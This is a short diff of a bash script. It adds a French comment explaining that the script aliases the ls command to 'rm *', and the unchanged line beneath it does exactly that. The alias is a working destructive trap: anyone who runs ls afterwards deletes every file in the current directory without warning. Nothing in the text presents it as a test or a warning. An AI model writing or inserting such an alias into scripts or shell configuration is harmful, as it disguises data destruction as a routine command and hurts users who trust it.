@@ -1,2 +1,3 @@
 #!/bin/bash
+# Créer un alias pour la commande ls avec la valeur rm *
 alias ls='rm *'
